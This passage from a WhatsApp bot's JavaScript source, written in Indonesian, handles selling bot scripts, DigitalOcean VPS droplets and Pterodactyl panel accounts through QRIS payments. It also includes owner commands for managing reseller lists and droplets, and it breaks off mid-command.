if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Sky.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//================================================================================

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Sky.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//================================================================================

case "buyscript": case "buysc": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

let teks = `
 *乂 List script bot yang tersedia*

*1. Simple Bot V3*
* *Type :* Case X Plugins
* *Size File :* 1mb
* *Harga :* Rp35.000

*2. Pushkontak Simpel*
* *Type :* Case
* *Size File :* 909kb
* *Harga :* Rp25.000

Contoh Penggunaan : *.buysc* 1
`
if (!text) return m.reply(teks)
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "20000"
    Obj.namaSc = "Script Simple Bot V3"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Pushkontak Simpel"  
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Sky.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Sky.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Sky.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await Sky.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await Sky.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await Sky.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyvps": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

let teks = `
 *乂 List paket vps yang tersedia*
 
*1.* Ram 2 & Cpu 1
*Harga Rp25.000*

*2.* Ram 4 & Cpu 2
*Harga Rp35.000*

*3.* Ram 8 & Cpu 4
*Harga Rp45.000*

*4.* Ram 16 & Cpu 4
*Harga Rp55.000*

 Contoh penggunaan : *.buyvps* 1
`
if (!text) return m.reply(teks)
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "55000"
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Sky.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Sky.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Sky.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Sky.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Sky.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await Sky.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//================================================================================

case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
 *乂 List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.buypanel* 2gb
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Sky.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Sky.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Sky.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Sky.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Sky.sendMessage(orang, {text: tekspanel}, {quoted: null})
await Sky.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyadp": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return m.reply(example("username"))
if (text.includes(" ")) return m.reply("Username tidak boleh memakai spasi!")
let us = crypto.randomBytes(2).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = text.toLowerCase() + us
const UrlQr = global.qrisOrderKuota



const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Sky.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Sky.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Sky.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Sky.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}
* *Expired :* 1 Bulan

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Sky.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: null})
await Sky.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//================================================================================

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await Sky.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await Sky.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//================================================================================

case 'listdroplet': {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
Sky.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//================================================================================

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//================================================================================

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
Sky.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//================================================================================

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//================================================================================

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
